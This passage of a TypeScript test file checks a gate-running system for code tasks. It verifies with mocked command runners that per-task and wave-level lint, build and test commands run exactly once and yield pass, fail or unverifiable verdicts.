    const ctx = ctxFor(dir, runner, {
      packet: { allowedFiles: ['src/feature.ts'], testFiles: ['src/feature.test.ts'] },
      manifests: { packageJson: '{"devDependencies":{"vitest":"^3.2.0"}}' }
    })

    const baseline = await captureGateBaseline(ctx)
    write(dir, { 'src/feature.ts': 'export const a = 2\n' })
    const report = await runGates(ctx, baseline)

    assert.equal(templateCommand, 'npx vitest run src/feature.test.ts')
    assert.equal(verdictOf(report.gates, 'task-tests'), 'pass')
  })
})

// ═══════════════════════════════════════════════════════════════════════════
// R3.3 — wave-level G1/G2
// ═══════════════════════════════════════════════════════════════════════════

describe('R3.3 — wave-level command gates', () => {
  test('runWaveCommandGates runs lint and build exactly once, attributed to the wave', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({ 'src/x.ts': 'export const x = 1\n' })
    const calls: string[] = []
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      calls.push(command)
      return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
    }
    const ctx = ctxFor(dir, runner, {
      taskId: 'W1',
      packet: null,
      plannedFiles: [],
      commands: {
        lint: { command: 'run-lint', provenance: 'detected' },
        build: { command: 'run-build', provenance: 'detected' }
      }
    })

    const report = await runWaveCommandGates(ctx)

    // No `test` command resolved → full-suite is unverifiable/no_command and
    // never spawns; the wave report is tainted but not failed.
    assert.equal(report.overall, 'unverifiable')
    assert.deepEqual(calls, ['run-lint', 'run-build'], 'each resolved command runs exactly once')
    assert.equal(report.gates.map((g) => g.name).join(','), 'lint,build,full-suite')
    assert.equal(verdictOf(report.gates, 'full-suite'), 'unverifiable')
    assert.equal(report.gates.find((g) => g.name === 'full-suite')!.reason, 'no_command')
  })

  test('P0.2 — full-suite runs once per wave when commands.test resolves, and passes green', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({ 'src/x.ts': 'export const x = 1\n' })
    const calls: string[] = []
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      calls.push(command)
      return { exitCode: 0, output: ['all pass'], timedOut: false, durationMs: 1 }
    }
    const ctx = ctxFor(dir, runner, {
      taskId: 'W1',
      packet: null,
      plannedFiles: [],
      commands: {
        lint: { command: 'run-lint', provenance: 'detected' },
        build: { command: 'run-build', provenance: 'detected' },
        test: { command: 'npm run test:unit', provenance: 'detected' }
      }
    })

    const report = await runWaveCommandGates(ctx)

    assert.equal(report.overall, 'pass')
    assert.deepEqual(calls, ['run-lint', 'run-build', 'npm run test:unit'])
    assert.equal(verdictOf(report.gates, 'full-suite'), 'pass')
  })

  test('P0.2 — a RED full suite fails the wave exactly like lint/build', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({ 'src/x.ts': 'export const x = 1\n' })
    const ctx = ctxFor(
      dir,
      gitRunner({ 'npm run test:unit': { exitCode: 1, output: ['1 failing'] } }),
      {
        taskId: 'W1',
        packet: null,
        plannedFiles: [],
        commands: {
          lint: { command: 'run-lint', provenance: 'detected' },
          build: { command: 'run-build', provenance: 'detected' },
          test: { command: 'npm run test:unit', provenance: 'detected' }
        }
      }
    )

    const report = await runWaveCommandGates(ctx)

    assert.equal(report.overall, 'fail', 'a red suite must fail the wave')
    const suite = report.gates.find((g) => g.name === 'full-suite')!
    assert.equal(suite.verdict, 'fail')
    assert.ok(suite.evidence.some((e) => e.includes('exited 1')), 'evidence names the failure')
  })

  test('P0.2 — absent test command → unverifiable/no_command, never a spawn, wave not failed', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({ 'src/x.ts': 'export const x = 1\n' })
    const calls: string[] = []
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      calls.push(command)
      return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
    }
    const ctx = ctxFor(dir, runner, {
      taskId: 'W1',
      packet: null,
      plannedFiles: [],
      commands: {
        lint: { command: 'run-lint', provenance: 'detected' },
        build: { command: 'run-build', provenance: 'detected' }
        // no `test` entry at all
      }
    })

    const report = await runWaveCommandGates(ctx)

    assert.notEqual(report.overall, 'fail', 'no_command must never fail the wave')
    assert.deepEqual(calls, ['run-lint', 'run-build'], 'nothing spawned for the absent command')
    const suite = report.gates.find((g) => g.name === 'full-suite')!
    assert.equal(suite.verdict, 'unverifiable')
    assert.equal(suite.reason, 'no_command')
  })

  test('a wave-level lint failure fails the wave report', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({ 'src/x.ts': 'export const x = 1\n' })
    const ctx = ctxFor(dir, gitRunner({ 'run-lint': { exitCode: 1, output: ['error'] } }), {
      taskId: 'W1',
      packet: null,
      plannedFiles: [],
      commands: {
        lint: { command: 'run-lint', provenance: 'detected' },
        build: { command: 'run-build', provenance: 'detected' }
      }
    })

    const report = await runWaveCommandGates(ctx)
    assert.equal(report.overall, 'fail')
    assert.equal(report.gates.find((g) => g.name === 'lint')!.verdict, 'fail')
  })

  test('commandGates: [] omits per-task lint/build — they belong to the wave', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const calls: string[] = []
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      calls.push(command)
      return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
    }
    const ctx = ctxFor(dir, runner, { commandGates: [] })
    const baseline = await captureGateBaseline(ctx)
    calls.length = 0 // discard the baseline red-proof call
    write(dir, { 'src/feature.ts': 'export const a = 2\n' })

    const report = await runGates(ctx, baseline)

    assert.ok(!report.gates.some((g) => g.name === 'lint' || g.name === 'build'))
    assert.deepEqual(calls, ['run-task-tests'], 'only the task test command runs')
  })

  test('P2a — commandGates: [‘build’] runs the typecheck per task and never lint', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const calls: string[] = []
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      calls.push(command)
      return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
    }
    const ctx = ctxFor(dir, runner, { commandGates: ['build'] })
    const baseline = await captureGateBaseline(ctx)
    calls.length = 0 // discard the baseline red-proof call
    write(dir, { 'src/feature.ts': 'export const a = 2\n' })

    const report = await runGates(ctx, baseline)

    assert.ok(!report.gates.some((g) => g.name === 'lint'), 'lint belongs to the drain point')
    assert.ok(report.gates.some((g) => g.name === 'build'), 'build runs per task')
    assert.deepEqual(calls, ['run-build', 'run-task-tests'])
  })

  test('without commandGates the per-task lint/build still run (back-compat)', async () => {
    if (!GIT_AVAILABLE) return
    const dir = makeRepo({
      'src/feature.ts': 'export const a = 1\n',
      'src/feature.test.ts': "test('a', () => {})\n"
    })
    const calls: string[] = []
    const runner: CommandRunner = async (command, opts) => {
      if (command.startsWith('git ')) return defaultCommandRunner(command, opts)
      calls.push(command)
      return { exitCode: 0, output: [], timedOut: false, durationMs: 1 }
    }
    const ctx = ctxFor(dir, runner)
    const baseline = await captureGateBaseline(ctx)
    calls.length = 0 // discard the baseline red-proof call
    write(dir, { 'src/feature.ts': 'export const a = 2\n' })

    await runGates(ctx, baseline)
    assert.deepEqual(calls, ['run-lint', 'run-build', 'run-task-tests'])
  })
})

process.on('exit', cleanup)

if (import.meta.url === `file://${process.argv[1]}`) void summaryAsync()
